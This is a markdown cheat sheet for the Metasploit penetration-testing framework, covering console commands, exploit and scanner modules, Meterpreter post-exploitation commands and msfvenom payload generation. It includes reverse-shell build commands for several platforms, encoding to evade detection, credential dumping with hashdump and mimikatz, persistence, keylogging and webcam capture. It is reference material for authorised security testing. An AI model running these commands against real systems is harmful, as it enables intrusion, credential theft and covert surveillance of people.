<!-- markdownlint-disable MD013 -->

# Metasploit Cheat Sheet

## Getting Started

- **Metasploit Framework** is a penetration testing framework that makes it easy
  to discover, exploit, and validate vulnerabilities
- Launch Metasploit console: `msfconsole`
- Exit console: `exit` or `quit`
- Search for modules: `search <keyword>`
- Use a module: `use <module_path>`
- Show module info: `info`
- Show options: `show options`
- Show payloads: `show payloads`

## Module Types

- **Exploit** - code that takes advantage of a vulnerability
- **Payload** - code that runs on the target system after exploitation
- **Auxiliary** - scanning, fuzzing, and other non-exploit modules
- **Post** - modules that run after successful exploitation
- **Encoder** - used to evade detection
- **NOP** - No Operation generators for payloads

## Common Commands

### Module Management

- List all modules: `show all`
- Show exploits: `show exploits`
- Show auxiliary modules: `show auxiliary`
- Show post modules: `show post`
- Show encoders: `show encoders`
- Show nops: `show nops`
- Reload module: `reload`

### Setting Options

- Set an option: `set <option> <value>`
- Set RHOST (target IP): `set RHOST <ip_address>`
- Set RPORT (target port): `set RPORT <port>`
- Set LHOST (listener IP): `set LHOST <ip_address>`
- Set LPORT (listener port): `set LPORT <port>`
- Unset an option: `unset <option>`
- Set all options: `setg <option> <value>` (global setting)
- Unset all options: `unsetg <option>`

### Payloads

- Show available payloads: `show payloads`
- Set payload: `set PAYLOAD <payload_name>`
- Generate standalone payload: `msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output_file>`
- List payloads: `msfvenom -l payloads`
- List formats: `msfvenom -l formats`
- List encoders: `msfvenom -l encoders`

### Execution

- Run exploit: `exploit` or `run`
- Run in background: `exploit -j` (job)
- List jobs: `jobs`
- Kill job: `jobs -k <job_id>`
- Interact with session: `sessions -i <session_id>`
- List sessions: `sessions -l`
- Kill session: `sessions -k <session_id>`
- Background session: `background` (from within session)

## Common Exploits

### SMB

- `use exploit/windows/smb/ms17_010_eternalblue`
- `use exploit/windows/smb/psexec`

### Web

- `use exploit/multi/http/apache_mod_cgi_bash_env_exec`
- `use exploit/unix/webapp/wp_admin_shell_upload`

### SSH

- `use auxiliary/scanner/ssh/ssh_login`

## Common Auxiliary Modules

### Scanning

- Port scan: `use auxiliary/scanner/portscan/tcp`
- SMB version: `use auxiliary/scanner/smb/smb_version`
- SMB shares: `use auxiliary/scanner/smb/smb_enumshares`
- SMB users: `use auxiliary/scanner/smb/smb_enumusers`
- FTP login: `use auxiliary/scanner/ftp/ftp_login`
- SSH login: `use auxiliary/scanner/ssh/ssh_login`
- HTTP version: `use auxiliary/scanner/http/http_version`

### Information Gathering

- HTTP headers: `use auxiliary/scanner/http/http_header`
- HTTP methods: `use auxiliary/scanner/http/http_methods`
- DNS enumeration: `use auxiliary/gather/dns_enum`

## Post-Exploitation

### Windows

- `use post/windows/gather/enum_logged_on_users`
- `use post/windows/gather/enum_shares`
- `use post/windows/gather/enum_applications`
- `use post/windows/gather/credentials/windows_autologin`
- `use post/windows/gather/smart_hashdump`

### Linux

- `use post/linux/gather/enum_users_history`
- `use post/linux/gather/enum_configs`
- `use post/linux/gather/enum_network`

## Meterpreter Commands

### System Information

- System info: `sysinfo`
- Get UID: `getuid`
- Get PID: `getpid`
- Get system: `getsystem` (privilege escalation)
- PS (list processes): `ps`
- Get env: `getenv`

### File System

- PWD: `pwd`
- CD: `cd <directory>`
- LS: `ls`
- Download: `download <file>`
- Upload: `upload <file>`
- Search: `search -f <filename>`
- Cat: `cat <file>`
- Edit: `edit <file>`

### Network

- IP config: `ipconfig` / `ifconfig`
- Route: `route`
- Port forward: `portfwd add -l <local_port> -p <remote_port> -r <remote_host>`
- List port forwards: `portfwd list`
- Remove port forward: `portfwd delete -l <local_port>`

### Privilege Escalation

- Get system: `getsystem`
- Migrate process: `migrate <pid>`
- Hashdump: `hashdump`
- Load mimikatz: `load kiwi` (Windows) or `load mimikatz`
- Mimikatz commands: `creds_all`, `golden_ticket_create`

### Persistence

- Run persistence: `run persistence -X -i <interval> -p <port> -r <ip>`
- Run metsvc: `run metsvc`

### Screenshots and Keylogging

- Screenshot: `screenshot`
- Webcam: `webcam_snap`
- Keyscan start: `keyscan_start`
- Keyscan dump: `keyscan_dump`
- Keyscan stop: `keyscan_stop`

## msfvenom Payload Generation

### Common Payloads

- Windows reverse shell: `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe`
- Linux reverse shell: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf`
- PHP reverse shell: `msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw -o shell.php`
- ASP reverse shell: `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o shell.asp`
- JSP reverse shell: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp`
- WAR file: `msfvenom -p java/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war`

### Encoding

- Encode payload: `msfvenom -p <payload> -e <encoder> -i <iterations>`
- List encoders: `msfvenom -l encoders`
- Bad characters: `-b '\x00\x0a'`

### Handlers

- Start handler: `use exploit/multi/handler`
- Set payload: `set PAYLOAD <payload_name>`
- Set options: `set LHOST <ip>`, `set LPORT <port>`
- Run: `exploit`

## Useful Tips

- Use `check` command to verify if target is vulnerable (if supported)
- Use `-j` flag with exploit to run in background
- Use `sessions -u <session_id>` to upgrade shell to meterpreter
- Use `resource` command to run a script file with commands
- Use `history` to view command history
- Use `help` or `?` for help on any command
- Use `search` with filters: `search type:exploit platform:windows`
- Use `grep` to filter output: `show options | grep RHOST`
